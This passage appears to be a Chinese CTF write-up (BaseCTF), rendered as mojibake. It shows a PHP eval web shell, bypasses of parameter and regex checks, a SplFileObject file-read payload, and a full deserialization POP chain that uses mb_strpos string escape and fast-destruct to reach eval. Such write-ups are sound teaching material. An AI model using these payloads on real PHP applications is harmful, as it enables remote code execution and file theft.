# è§‰å¾—å›°éš¾çš„è¯å°±ç›´æ¥æŠŠshellæ‹¿å»ç”¨å§ï¼Œä¸ç”¨è°¢~
$shell=$_POST['shell'];
eval($shell);
?>
```
:::

ç¬¬ä¸€å¤„getå‚æ•°ç»•è¿‡ï¼š`$emp=$_GET['e_m.p'];`ï¼ŒåŒæ—¶å«æœ‰`_`ä¸‹åˆ’çº¿å’Œ`.`ç‚¹ï¼Œéœ€è¦æŠŠä¸‹åˆ’çº¿å†™æˆ`[`å·¦æ–¹æ‹¬å·ã€‚éœ€è¦ä¼ `e[m.p`

ç¬¬äºŒå¤„ifè¯­å¥ç»•è¿‡ï¼š`if($emp!="114514"&&intval($emp,0)===114514)`ï¼Œè¿™é‡Œä¼šåˆ¤æ–­$empï¼Œä¸èƒ½ç›´æ¥æ˜æ–‡=114514ï¼Œå¦‚æœæ˜¯0å¼€å¤´çš„è¿›åˆ¶æ•´å½¢æ•°æ—¶æ‰èƒ½æ»¡è¶³

åœ¨è®¡ç®—æœºé‡Œè®¡ç®—114514çš„å…¶ä»–è¿›åˆ¶è¡¨ç¤ºï¼Œåœ¨ä¸‹é¢è¿˜ä¼šåˆ¤æ–­ä¸èƒ½å«æœ‰å­—æ¯ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦8è¿›åˆ¶çš„114514ï¼Œå³`0337522`

ç¬¬ä¸‰å¤„ç»•è¿‡

```php
if (preg_match('/.+?HACKER/is',$try)){
        die("ä½ æ˜¯hackerè¿˜æ•¢è‡ªæŠ¥å®¶é—¨å‘¢ï¼Ÿ");
    }
    if (!stripos($try,'HACKER') === TRUE){
        die("ä½ è¿è‡ªå·±æ˜¯hackeréƒ½ä¸æ‰¿è®¤ï¼Œè¿˜æƒ³è¦flagå‘¢ï¼Ÿ");
    }
```

åœ¨è¿™é‡Œçš„ç¬¬ä¸€ä¸ªifè¯­å¥é‡Œï¼Œä½¿ç”¨äº†`éè´ªå©ªåŒ¹é…`æ­£åˆ™è¡¨è¾¾å¼æ£€æŸ¥å˜é‡$tryï¼Œè¿™ä¸¤ä¸ªifè¯­å¥çš„ä½œç”¨å°±æ˜¯ï¼Œè¦æ±‚å˜é‡$tryä¸­ä¸èƒ½å«æœ‰hackerï¼Œåˆè¦æ±‚åœ¨$tryä¸­å¿…é¡»èƒ½æ‰¾åˆ°hacker

::: tip
å¯ä»¥å‚è€ƒï¼š[ã€æ­£åˆ™è¡¨è¾¾å¼,å¤ç°ç»•è¿‡æ¡ˆä¾‹ã€‘](https://blog.csdn.net/weixin_59280309/article/details/125881818)
:::

åœ¨è¿™ç¯‡æ–‡ç« é‡Œï¼Œä½œè€…ä½¿ç”¨`/*1000000å¤šä¸ªa*/hacker`ï¼Œç»•è¿‡äº†éè´ªå©ªåŒ¹é…çš„é™åˆ¶

```python
# POSTï¼štry=/*1001000ä¸ªa*/hacker
print("/*"+"a"*1001000+"*/hacker")
```

æœ€åæ¥æ”¶a,b,cä¸‰ä¸ªå‚æ•°ï¼Œä¸€çœ¼åŸç”Ÿç±»è¯»å–æ–‡ä»¶

ä½¿ç”¨åŸç”Ÿç±»`SplFileObject`ï¼Œæ­é…ä¼ªåè®®å’Œ__toStringæ–¹æ³•è¯»å–æ–‡ä»¶å†…å®¹ã€‚`payloadï¼ša=SplFileObject&b=php://filter/convert.base64-encode/resource=flag.php&c=__toString`ï¼Œ`(new $a($b))->$c()`åœ¨XYCTFé‡Œç¢°åˆ°ä¸€æ¬¡ï¼Œæœ‰ç‚¹å°è±¡ï¼Œç›´æ¥æ¢­å“ˆ

æ‰€ä»¥æœ€åçš„payloadï¼š

GETï¼š`?e[m.p=0337522&a=SplFileObject&b=php://filter/convert.base64-encode/resource=flag.php&c=__toString`
POSTï¼š`try=/*1001000ä¸ªa*/hacker`ï¼Œé‡Œé¢çš„aç”¨pythonæ‰“å‡ºæ¥æ‰‹åŠ¨å¤åˆ¶æ›¿æ¢è¿›å»

## [Fin] ez_php

::: tip ç¬”è€…è¯´
è¿™é“é¢˜å¡äº†æˆ‘ä¸¤å¤©ï¼Œåšèµ·æ¥å¤ªçˆ½å•¦ï¼Œå¡åœ¨äº†wakeupçš„`$this->username="hacker";$this->end = $this->start;`ï¼Œæ™¨æ›¦å¸ˆå‚…é¢˜ç›®å¤ªèµå•¦

æœ€åï¼Œè¿™ç§éå¸¸é•¿çš„é¢˜ç›®å»ºè®®ä¸€å®šè¦å¤åˆ¶åˆ°æœ¬åœ°æµ‹è¯•ï¼Œå¤šåŠ å‡ å¥è°ƒè¯•è¯­å¥ï¼Œè§‚å¯Ÿè¿›åº¦ï¼Œä¸ç„¶å¾ˆéš¾çœ‹å‡ºæ¥é—®é¢˜åœ¨å“ª
:::

è€ƒç‚¹ï¼š`phpç‰¹æ€§ mb_strposå‡½æ•°çš„æ¼æ´ wakeupç»•è¿‡ fast-destruct å±æ€§å¼•ç”¨`

æºç 

::: details
```php
<?php
highlight_file(__file__);
function substrstr($data)
{
    $start = mb_strpos($data, "[");
    $end = mb_strpos($data, "]");
    return mb_substr($data, $start + 1, $end - 1 - $start);
}

class Hacker{
    public $start;
    public $end;
    public $username="hacker";
    public function __construct($start){
        $this->start=$start;
    }
    public function __wakeup(){
        $this->username="hacker";
        $this->end = $this->start;
    }

    public function __destruct(){
        if(!preg_match('/ctfer/i',$this->username)){
            echo 'Hackerï¼';
        }
    }
}

class C{
    public $c;
    public function __toString(){
        $this->c->c();
        return "C";
    }
}

class T{
    public $t;
    public function __call($name,$args){
        echo $this->t->t;
    }
}
class F{
    public $f;
    public function __get($name){
        return isset($this->f->f);
    }

}
class E{
    public $e;
    public function __isset($name){
        ($this->e)();
    }

}
class R{
    public $r;

    public function __invoke(){
        eval($this->r);
    }
}

if(isset($_GET['ez_ser.from_you'])){
    $ctf = new Hacker('{{{'.$_GET['ez_ser.from_you'].'}}}');
    if(preg_match("/\[|\]/i", $_GET['substr'])){
        die("NONONO!!!");
    }
    $pre = isset($_GET['substr'])?$_GET['substr']:"substr";
    $ser_ctf = substrstr($pre."[".serialize($ctf)."]");
    $a = unserialize($ser_ctf);
    throw new Exception("æ‚é±¼~æ‚é±¼~");
}
```
:::

çœ‹ç¨‹åºæœ€åçš„å…¥å£ifè¯­å¥ï¼Œä¼ çš„å˜é‡å€¼ä¼šé€šè¿‡`construct`æ„é€ å‡½æ•°ï¼Œåˆ›å»º$ctfå¯¹è±¡ï¼Œæ¥ç€åˆ¤æ–­å¦ä¸€ä¸ªGETå‚æ•°`substr`ï¼Œæ£€æŸ¥ä»–æ˜¯å¦å«æœ‰`[]`å·¦å³æ–¹æ‹¬å·ï¼Œå¦‚æœå«æœ‰ï¼Œå°±ä¼šç»“æŸç¨‹åºï¼Œå¦åˆ™èµ‹å€¼ç»™$preï¼Œå†æŠŠå˜é‡$preå’Œåºåˆ—åŒ–çš„$ctfæ‹¼æ¥åœ¨ä¸€èµ·ï¼Œä½¿ç”¨è‡ªå®šä¹‰çš„`substrstr`å‡½æ•°å¤„ç†ï¼Œæœ€åååºåˆ—åŒ–ï¼Œé‡åˆ°é”™è¯¯ä¼šæŠ›å‡ºå¼‚å¸¸

ä¸»è¦é€»è¾‘è®²å®Œäº†ï¼Œç°åœ¨å¼€å§‹åˆ†æç»•è¿‡æ€è·¯ï¼š

- ç¬¬ä¸€å¤„`$_GET['ez_ser.from_you']`ï¼Œphpç‰¹æ€§ï¼ŒåŒæ—¶å‡ºç°`_`ä¸‹åˆ’çº¿å’Œ`.`ç‚¹ï¼Œéœ€è¦æŠŠä¸‹åˆ’çº¿å†™æˆ`[`å·¦æ–¹æ‹¬å·ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦ä¼ `ez[ser.from_you`
- ä¸èƒ½è¯•å›¾é€šè¿‡æ•°ç»„ç±»å‹$substrç»•è¿‡æ­£åˆ™ï¼Œå› ä¸ºå³ä½¿ç»•è¿‡ä¹Ÿä¸ä¼šè§¦å‘å­—ç¬¦ä¸²é€ƒé€¸ï¼Œåé¢substrstrå‡½æ•°æ ¹æœ¬å°±ä¸ä¼šå¤„ç†ä½ çš„æ•°ç»„æ•°æ®
- è‡ªå®šä¹‰çš„substrstrå‡½æ•°é‡Œä½¿ç”¨äº†å­˜åœ¨æ¼æ´çš„å‡½æ•°`mb_strpos`
- æƒ³è§¦å‘popé“¾ï¼Œå…³é”®åœ¨ä»HACKERç±»åˆ°popçš„è·³è·ƒï¼Œåœ¨`destruct`æ–¹æ³•é‡Œï¼Œ`if(!preg_match('/ctfer/i',$this->username))`æŠŠ`$this->username`å½“ä½œå­—ç¬¦ä¸²ï¼Œä¼šè§¦å‘__toStringé­”æœ¯æ–¹æ³•
- åœ¨HACKERç±»é‡ŒåŒæ—¶å­˜åœ¨wakeup,destructé­”æœ¯æ–¹æ³•ï¼Œwakeupä¼šé‡æ–°èµ‹å€¼$usernameä¸ºå­—ç¬¦ä¸²ï¼Œè¿™é‡Œå¾ˆå…³é”®ï¼Œä¼šç ´åé“¾å­
- wakeupä¼šæ¯”destructå…ˆè§¦å‘ï¼Œæˆ‘ä»¬éœ€è¦å…ˆè§¦å‘destruct


::: tip å…³äº`mb_strpos`çš„æ¼æ´
å‚è€ƒï¼š[åˆ©ç”¨mb_strposä¸mb_substrè¿™ä¸¤ä¸ªå‡½æ•°å¯¹æŸäº›ä¸å¯è§å­—ç¬¦çš„è§£æ](https://www.cnblogs.com/gxngxngxn/p/18187578)
:::

`gxngxngxn`å¸ˆå‚…è®²çš„å¾ˆè¯¦ç»†ï¼Œå¯ä»¥é€šè¿‡`mb_strpos`å‡½æ•°æ— æ³•è§£æ`%9f`,`%09`ï¼Œæ„é€ å‡ºå­—ç¬¦ä¸²é€ƒé€¸

```PHP
$ser_ctf = substrstr($pre."[".serialize($ctf)."]");
$a = unserialize($ser_ctf);
```

æœ€ç»ˆç›®çš„æ˜¯è¦ååºåˆ—åŒ–ä¸€ä¸ªé¢˜ç›®ç»™çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œä½†æ˜¯æˆ‘ä»¬ç”¨ä¸äº†ã€‚æ‰€ä»¥éœ€è¦è‡ªå·±æ„é€ ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡`ez[ser.from_you`å‚æ•°ä¼ å…¥æˆ‘ä»¬çš„åºåˆ—åŒ–å¥½çš„å­—ç¬¦ä¸²ï¼Œæ„é€ å‡½æ•°ä¼šèµ‹å€¼ç»™$ctf->startã€‚åœ¨subsstrstrå¤„ç†å‰ï¼Œåºåˆ—åŒ–ä¸¤æ¬¡çš„HACKERçš„å¯¹è±¡

æ‰€ä»¥è¿™ä¸ªåºåˆ—åŒ–çš„å­—ç¬¦æœ‰ä¸¤ä¸ªå¤´`O:6:"Hacker":3:{s:98:"start";s:1:"1";O:6:"Hacker":3:{.....}";s:3:"end";s:1:"1";..`ï¼Œè¿™æ ·ï¼Œç¬¬äºŒæ¬¡åºåˆ—åŒ–æŠŠæˆ‘ä»¬æ•´ä¸ªpayloadéƒ½èµ‹å€¼åœ¨starté‡Œäº†ï¼Œæˆ‘ä»¬åˆ©ç”¨substrstrå‡½æ•°çš„æ¼æ´ï¼ŒæŠŠå‰é¢çš„åƒæ‰ï¼Œåé¢çš„ä¸ç®¡ï¼Œé‚£ä¹ˆå°±å®ç°äº†å­—ç¬¦ä¸²é€ƒé€¸

ç°åœ¨æ„é€ æˆ‘ä»¬çš„payloadï¼š

é“¾å­çš„å¤´æ˜¯Hackerç±»çš„usernameå±æ€§ï¼ŒæŠŠusernameé“¾æ¥æˆCç±»çš„å¯¹è±¡ï¼Œé€šè¿‡æŠŠusernameå½“ä½œå­—ç¬¦ä¸²è¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œè§¦å‘toStringæ–¹æ³•ï¼Œåé¢ç±»çš„popé“¾æ¥å°±ç®€å•äº†ï¼Œè¿™é‡Œä¸ç»†è®²äº†ï¼Œä¸æ˜ç™½å¯ä»¥ç›´æ¥è¯„è®ºç•™è¨€ã€‚

ç°åœ¨æ‹¿åˆ°é“¾å­ä¸èƒ½ç›´æ¥ç”¨ï¼Œå› ä¸ºwakeupä¼šé‡æ–°èµ‹å€¼usernameå±æ€§ï¼Œç ´åäº†toStringæ–¹æ³•å’Œåç»­é“¾å­çš„é“¾æ¥ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡`fast-destruct`æ¥å…ˆæ‰§è¡Œ`destruct`æ–¹æ³•ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¿ç•™usernameçš„å€¼ï¼Œ`$this->username="hacker";$this->end = $this->start;`è¿™é‡Œæ˜¯å…³é”®ï¼Œwakeupå…ˆé‡èµ‹å€¼usernameå±æ€§ï¼Œæˆ‘ä»¬å¯ä»¥è®©usernameå’Œendäº’ç›¸å¼•ç”¨ï¼Œè¿™æ ·ï¼Œåœ¨wakeupèµ‹å€¼ä¸€æ¬¡åï¼Œä¼šè¢«startå†èµ‹å€¼ä¸€æ¬¡ï¼Œé‚£ä¹ˆstartå°±æ˜¯è¿™é‡Œçš„å…³é”®äº†

ç°åœ¨ç»™å‡ºæ„é€ çš„payloadï¼š

::: details
```php
<?php
highlight_file(__file__);
function substrstr($data)
{
    $start = mb_strpos($data, "[");
    $end = mb_strpos($data, "]");
    return mb_substr($data, $start + 1, $end - 1 - $start);
}

class Hacker{
    public $start;
    public $end;
    public $username="hacker";
    public function __construct($start){
        $this->start=$start;
    }
    public function __wakeup(){
        echo "<br><br>ç¬¬ä¸€æ¬¡æµ‹è¯•wakeup";
        var_dump($this);
        echo "<br><br>__wakeupè§¦å‘";
        $this->username = "hacker";
        $this->end = $this->start;
        echo "<br><br>ç¬¬äºŒæ¬¡æµ‹è¯•wakeup";
        var_dump($this);
    }

    public function __destruct(){
        if(!preg_match('/ctfer/i',$this->username)){
            echo "__destructè§¦å‘";
            echo 'Hackerï¼';
        }
    }
}

class C{
    public $c;
    public function __toString(){
        $this->c->c();
        return "C";
    }
}

class T{
    public $t;
    public function __call($name,$args){
        echo $this->t->t;
    }
}
class F{
    public $f;
    public function __get($name){
        return isset($this->f->f);
    }

}
class E{
    public $e;
    public function __isset($name){
        ($this->e)();
    }

}
class R{
    public $r;

    public function __invoke(){
        eval($this->r);
    }
}

// if(isset($_GET['ez_ser.from_you'])){
//     $ctf = new Hacker('{{{'.$_GET['ez_ser.from_you'].'}}}');
//     var_dump($ctf);
//     echo "<br>";
//     if(preg_match("/\[|\]/i", $_GET['substr'])){
//         die("NONONO!!!");
//     }
//     $pre = isset($_GET['substr'])?$_GET['substr']:"substr";
//     $ser_ctf = substrstr($pre."[".serialize($ctf)."]");
//     echo "<br><br>########\$ser_ctf:".$ser_ctf."<br><br>";
//     $a = unserialize($ser_ctf);
//     var_dump($a);
//     throw new Exception("æ‚é±¼~æ‚é±¼~");
// }


$c = new C();

$t = new T();
$f = new F();
$e = new E();
$r = new R();
$payload = new Hacker($c);
$payload -> username = &$payload -> end;
$c -> c = $t;
$t -> t = $f;
$f -> f = $e;
$e -> e = $r;
$r -> r = "phpinfo();";
echo serialize($payload);
```
:::

ç°åœ¨æ‹¿åˆ°äº†é“¾å­ï¼š`O:6:"Hacker":3:{s:5:"start";O:1:"C":1:{s:1:"c";O:1:"T":1:{s:1:"t";O:1:"F":1:{s:1:"f";O:1:"E":1:{s:1:"e";O:1:"R":1:{s:1:"r";s:10:"phpinfo();";}}}}}s:3:"end";N;s:8:"username";R:8;}`

ç°åœ¨åªéœ€è¦è®©`destruct`æ–¹æ³•æ‰§è¡Œå°±å¯ä»¥å‘½ä»¤æ‰§è¡Œäº†

::: tip fast-destructæ¨èæ–‡ç« 
[PHPååºåˆ—åŒ–ä¸­wakeup()ç»•è¿‡æ€»ç»“](https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/)  
:::

é€šè¿‡è¿™ä¸ªæ–‡ç« ï¼Œå¯ä»¥å­¦ä¹ åˆ°ä¸¤ç§è§¦å‘`fast-destruct`çš„æ–¹æ³•

- å»æ‰æœ«å°¾å¤§æ‹¬å·
- å¤§æ‹¬å·å‰æ·»åŠ æ•°å­—1

æ‰€ä»¥ä¸¤ç§payloadï¼š
`O:6:"Hacker":3:{s:5:"start";O:1:"C":1:{s:1:"c";O:1:"T":1:{s:1:"t";O:1:"F":1:{s:1:"f";O:1:"E":1:{s:1:"e";O:1:"R":1:{s:1:"r";s:10:"phpinfo();";}}}}}s:3:"end";N;s:8:"username";R:8;`

`O:6:"Hacker":3:{s:5:"start";O:1:"C":1:{s:1:"c";O:1:"T":1:{s:1:"t";O:1:"F":1:{s:1:"f";O:1:"E":1:{s:1:"e";O:1:"R":1:{s:1:"r";s:10:"phpinfo();";}}}}}s:3:"end";N;s:8:"username";R:8;1}`

ç°åœ¨åˆ©ç”¨substrstrå‡½æ•°æ— æ³•è§£æ`%09,%9f`æŠŠæˆ‘ä»¬çš„payloadä»ä¸¤æ¬¡åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­é€ƒé€¸å‡ºæ¥

`?ez[ser.from_you=O:6:"Hacker":3:{s:5:"start";O:1:"C":1:{s:1:"c";O:1:"T":1:{s:1:"t";O:1:"F":1:{s:1:"f";O:1:"E":1:{s:1:"e";O:1:"R":1:{s:1:"r";s:10:"phpinfo();";}}}}}s:3:"end";N;s:8:"username";R:8;1}&substr=%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%9f%9f%9f%f0%f0%f0%f0%9f%9f%9f%f0%f0%f0%f0%f0%f0%f0%f0%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%f0%f0%f0%f0%f0%f0%f0%f0%9f%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0`

![11](/medias/basectf/11.png)

## å…¶ä»–  ã€å¾…å¤ç°ã€‘